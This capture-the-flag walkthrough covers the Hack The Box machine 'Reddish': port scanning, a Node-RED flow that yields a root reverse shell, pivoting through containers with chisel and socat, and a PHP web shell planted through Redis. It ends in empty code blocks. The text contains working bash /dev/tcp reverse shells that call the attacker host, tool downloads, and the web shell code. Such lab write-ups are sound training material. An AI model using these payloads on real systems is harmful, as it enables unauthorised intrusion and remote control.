# Reddish

```bash
TARGET=10.10.10.94
```

```bash
$ sudo  nmap -sT -p- --min-rate 5000 $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 15:11 PDT
Warning: 10.10.10.94 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.94
Host is up (0.092s latency).
Not shown: 59145 closed tcp ports (conn-refused), 6389 filtered tcp ports (no-response)
PORT     STATE SERVICE
1880/tcp open  vsat-control

Nmap done: 1 IP address (1 host up) scanned in 61.01 seconds
```

```bash
$ sudo nmap -v -sC -sV $TARGET -p 1880

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA

```

```bash
$ curl -s -X GET http://10.10.10.94:1880/                                                  
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>
```

```bash
$ curl -s -X POST http://10.10.10.94:1880/
{"id":"42b192f0baf72f65da10ac5016c0f636","ip":"::ffff:10.10.14.8","path":"/red/{id}"}
```

![node-RED](images/node-red-search.png)

```bash
$ curl -s -X GET http://10.10.10.94:1880/red/42b192f0baf72f65da10ac5016c0f636
Moved Permanently. Redirecting to /red/42b192f0baf72f65da10ac5016c0f636/
```

![node-RED ID](images/node-red-id.png)

![alt text](images/node-red-import.png)

> Import the following flow after changing the IP where the listener will be located.

- [Shell Flow](node-red_revshell.json)

![alt text](images/node-red-import-json.png)

![alt text](images/node-red-import-json-shell.png)

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
```

Now Deploy the flow.

![deploy](images/node-red-deply-flow.png)

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.94] 55446
id
uid=0(root) gid=0(root) groups=0(root)
```

## Node-RED container - 172.18.0.2 172.19.0.3

Lets try to get a more consistent shell.

```bash
$ rlwrap -cAr nc -nlvp 9002
listening on [any] 9002 ...
```

```bash
[object Object]bash -c "bash -i > /dev/tcp/10.10.14.8/9002 0>&1" &
```

```bash
$ rlwrap -cAr nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.94] 50056
id
uid=0(root) gid=0(root) groups=0(root)
```

Now stabilize the shell.

```bash
script /dev/null -c bash
(ctrl+z)
stty raw -echo; fg
reset xterm (press Enter)
stty rows 39 columns 155 (adapt this to your stty size)
export TERM=xterm
export SHELL=bash
```

```bash
root@nodered:/node-red# uname -a
uname -a
Linux nodered 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 GNU/Linux
```

```bash
root@nodered:/node-red# cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
```

```bash
root@nodered:/node-red# pwd
pwd
/node-red

root@nodered:/node-red# hostname 
hostname 
nodered

root@nodered:/node-red# hostname -I
hostname -I
172.19.0.3 172.18.0.2
```

```bash
root@nodered:/node-red# cat /proc/net/arp
cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.1       0x1         0x2         02:42:1d:02:97:ab     *        eth0

root@nodered:/node-red# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
13: eth1@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
15: eth0@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

After trying a few options to transfer files to the current target, I found out that I good approach would be use an oneliner Perl to accomplish it.

I started a webserver on my Kali

```bash
$ python3 -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
```

And moved to the target, a bash script to enumerate hosts.

```bash
#!/bin/bash

if [ -z "$1" ]; then
  echo -e "Provide the first 3 octets of the network to scan\nusage: $0 192.168.56"
else
  network="$1"
  echo -e "\n--- SCAN ON HOST $network.(1..255) ---"
  for host in {1..255}; do
  ( 
    ping -c 1 -w 1 $network.$host >/dev/null 2>&1 && echo -e "\t[+] Active Host $network.$host" 
  ) &
  done
  wait
  echo "--- Finished scan ---"
fi
```

```bash
root@nodered:/tmp# perl -MHTTP::Tiny -e '$http = HTTP::Tiny->new; $http->mirror("http://10.10.14.8:8181/scan_hosts.sh", "scan_hosts.sh");'
"http://10.10.14.8:8181/scan_hosts.sh", "scan_hosts.sh");'or(
```

To check if the transfer worked well, I ran md5sum on my local version and in the transfer one to see if the hashes match.

```bash
$ md5sum scan_hosts.sh 
153ad569ada63a2d3114cbd5b31cd08f  scan_hosts.sh
```

```bash
root@nodered:/tmp# md5sum scan_hosts.sh
md5sum scan_hosts.sh
153ad569ada63a2d3114cbd5b31cd08f  scan_hosts.sh
```

I then scan the 2 networks we see on this target.

```bash
root@nodered:/tmp# bash scan_hosts.sh 172.18.0
bash scan_hosts.sh 172.18.0

--- SCAN ON HOST 172.18.0.(1..255) ---
        [+] Active Host 172.18.0.2
        [+] Active Host 172.18.0.1
--- Finished scan ---

root@nodered:/tmp# bash scan_hosts.sh 172.19.0
bash scan_hosts.sh 172.19.0

--- SCAN ON HOST 172.19.0.(1..255) ---
        [+] Active Host 172.19.0.3
        [+] Active Host 172.19.0.4
        [+] Active Host 172.19.0.2
        [+] Active Host 172.19.0.1
--- Finished scan ---
```

To scan the port of the IPs, we could write a small script or use something small and already available like this [one here](https://github.com/xffsec/netscan).

```bash
root@nodered:/tmp# bash netscan.sh -P -t 172.19.0 -R 2-4 -r 1-10000
bash netscan.sh -P -t 172.19.0 -R 2-4 -r 1-10000

--- SCANNING PORTS ON EACH HOST - 172.19.0.2-4:1-10000 ---

[+] 172.19.0.2:6379
[+] 172.19.0.3:1880
[+] 172.19.0.4:80

--- Finished scan ---
```

We have a lot of going on here and to best visualize what I believe we have, I created the following on [https://app.diagrams.net/](https://app.diagrams.net/).

![Reddish diagrama](images/reddish_initial_diagrama.png)

I believe we will need to use a proxy chain tool to help investigate it here.

```bash
root@nodered:/tmp# perl -MHTTP::Tiny -e '$http = HTTP::Tiny->new; $http->mirror("http://10.10.14.8:8181/chisel", "chisel");'
"http://10.10.14.8:8181/chisel", "chisel");'w; $http->mirror(
```

```bash
root@nodered:/tmp# chmod +x chisel
chmod +x chisel
```

```bash
$ /opt/chisel/v1.9.1/chisel server -p 8000 --reverse          
2024/08/22 22:50:23 server: Reverse tunnelling enabled
2024/08/22 22:50:23 server: Fingerprint gr2BQ7AgYD0oDhBTwYEV9D7J0OkTpEp6TEbbwS6RrNk=
2024/08/22 22:50:23 server: Listening on http://0.0.0.0:8000
```

```bash
root@nodered:/tmp# ./chisel client 10.10.14.8:8000 R:socks
./chisel client 10.10.14.8:8000 R:socks
2024/08/23 05:52:26 client: Connecting to ws://10.10.14.8:8000
2024/08/23 05:52:27 client: Connected (Latency 99.253445ms)
```

```bash
$ /opt/chisel/v1.9.1/chisel server -p 8000 --reverse          
2024/08/22 22:50:23 server: Reverse tunnelling enabled
2024/08/22 22:50:23 server: Fingerprint gr2BQ7AgYD0oDhBTwYEV9D7J0OkTpEp6TEbbwS6RrNk=
2024/08/22 22:50:23 server: Listening on http://0.0.0.0:8000
2024/08/22 22:52:22 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
$ cat /etc/proxychains4.conf
...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5         127.0.0.1 1080
#socks5         127.0.0.1 1081
#http           127.0.0.1 8080
```

## Web server container - 172.19.0.4

```bash
$ proxychains nmap -sT -p 80 -Pn -n 172.19.0.4
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 23:01 PDT
Nmap scan report for 172.19.0.4
Host is up (0.29s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

![Proxychains Webserver](images/proxy_webserver.png)

The source code of the page shows some interesting js functions.

![webpage source code](images/proxy_webserver_sourcecode.png)

```html

        <script type="text/javascript">
						$(document).ready(function () {
								incrCounter();
						    getData();
						});

						function getData() {
						    $.ajax({
						        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
						        cache: false,
						        dataType: "text",
						        success: function (data) {
											console.log("Number of hits:", data)
						        },
						        error: function () {
						        }
						    });
						}

						function incrCounter() {
						    $.ajax({
						        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
						        cache: false,
						        dataType: "text",
						        success: function (data) {
				              console.log("HITS incremented:", data);
						        },
						        error: function () {
						        }
						    });
						}

						/*
							* TODO
							*
							* 1. Share the web folder with the database container (Done)
							* 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
							* ...Still don't know how to complete it...
						*/
						function backupDatabase() {
								$.ajax({
										url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
										cache: false,
										dataType: "text",
										success: function (data) {
											console.log("Database saved:", data);
										},
										error: function () {
										}
								});
						}
		</script>
```

Trying to access the backup functions times out, and revel to us the path the files are located on the error msg.

![www path](images/proxy_webserver_www_path.png)

```bash
/var/www/html/8924d0549008565c554f8128cd11fda4/
```

## Redis container - 172.19.0.2

```bash
$ proxychains nmap -sT -p 6379 -Pn -n 172.19.0.2           
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 23:01 PDT
Nmap scan report for 172.19.0.2
Host is up (0.29s latency).

PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

```bash
$ proxychains redis-cli -h 172.19.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
172.19.0.2:6379>
```

On [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) we see a few options to upload a webshell to redis and access it from the web server.

We prepare a shell.php file

```bash
$ cat shell.php                                                     


<?php
    system($_REQUEST['cmd']);
?>
```

And we also prepare a script to push the shell to redis.

```bash
$ cat pwn_redis-cli.sh 
#!/bin/bash

proxychains redis-cli -h 172.19.0.2 flushall
cat shell.php | proxychains redis-cli -h 172.19.0.2 -x set crackit
proxychains redis-cli -h 172.19.0.2 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
proxychains redis-cli -h 172.19.0.2 config set dbfilename "shell.php"
proxychains redis-cli -h 172.19.0.2 save
```

```bash
$ bash pwn_redis-cli.sh                                                        
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
OK
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
OK
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
OK
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
OK
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
OK
```

![Webshell redis](images/webshell_redis_id.png)

Playing a bit with the shell we noticed that it can talk back to the node-RED container, but it cannot talk back to our kali.

Because of that we need to use again the node-RED as a jump box, and we are using socat to help us here.

Searching on the internet we find another static binary that we can use on this github page - [socat static](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

```bash
root@nodered:/tmp# perl -MHTTP::Tiny -e '$http = HTTP::Tiny->new; $http->mirror("http://10.10.14.8:8181/socat-static", "socat-static");'
"http://10.10.14.8:8181/socat-static", "socat-static");'rror(
```

```bash
root@nodered:/tmp# chmod +x socat-static
chmod +x socat-static
```

Redirect any connection to port `5555` on node-Red to port `5555` on my Kali.

```bash
root@nodered:/tmp# /tmp/socat-static tcp-listen:5555,fork tcp:10.10.14.8:5555 &
/tmp/socat-static tcp-listen:5555,fork tcp:10.10.14.8:5555 &
[1] 1708
```

To play a little and understand more, I used the static socat on the kali machine to see of the connection from node-red would arrive on port 5555.

For that I initiate socat as a listener and instructed it to print the connections on the terminal and keep listening.

```bash
$ socat TCP-LISTEN:5555,reuseaddr,fork SYSTEM:"echo 'Connection from: $SOCAT_PEERADDR:$SOCAT_PEERPORT'; sleep 10"
```

On node-red I tested the connection to its on IP and localhost (only to play with it).

```bash
root@nodered:/tmp# echo > /dev/tcp/172.19.0.3/5555
echo > /dev/tcp/172.19.0.3/5555

root@nodered:/tmp# echo > /dev/tcp/127.0.0.1/5555
echo > /dev/tcp/127.0.0.1/5555
```

Both arrived fine on my kali.

```bash
$ socat TCP-LISTEN:5555,reuseaddr,fork SYSTEM:"echo 'Connection from: $SOCAT_PEERADDR:$SOCAT_PEERPORT'; sleep 10" 
2024/08/23 02:04:35 socat[473838] W exiting on signal 15
2024/08/23 02:06:53 socat[474995] W exiting on signal 15
```

Now I need to test it direct on the shell on the webserver.

![cyberchef](images/webshell_redis_cyberchef.png)

```bash
bash -c 'echo > /dev/tcp/172.19.0.3/5555'
```

```bash
http://172.19.0.4/8924d0549008565c554f8128cd11fda4/shell.php?cmd=bash%20%2Dc%20%27echo%20%3E%20%2Fdev%2Ftcp%2F172%2E19%2E0%2E3%2F5555%27
```

![webshell redis socat tcp test](images/webshell_redis_socat_tcp_test.png)

```bash
$ socat TCP-LISTEN:5555,reuseaddr,fork SYSTEM:"echo 'Connection from: $SOCAT_PEERADDR:$SOCAT_PEERPORT'; sleep 10" 
2024/08/23 02:04:35 socat[473838] W exiting on signal 15
2024/08/23 02:06:53 socat[474995] W exiting on signal 15
2024/08/23 02:15:32 socat[479579] W exiting on signal 15   <<<<=====
```

I believe now we know the redirect works and we can try to set a `nc` listener on our kali to try to get a reverse shell.

```bash
$ rlwrap -cAr nc -nlvp 5555
listening on [any] 5555 ...
```

![Cyberchef rev shell](images/webshell_redis_cyberchef_revshell.png)

```bash
bash -c 'bash -i >& /dev/tcp/172.19.0.3/5555 0>&1'
```

```bash
bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F172%2E19%2E0%2E3%2F5555%200%3E%261%27
```

![webshell - redis - nc - revshell](images/webshell_redis_nc_revshell.png)

```bash
$ rlwrap -cAr nc -nlvp 5555      
listening on [any] 5555 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.94] 49728
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```
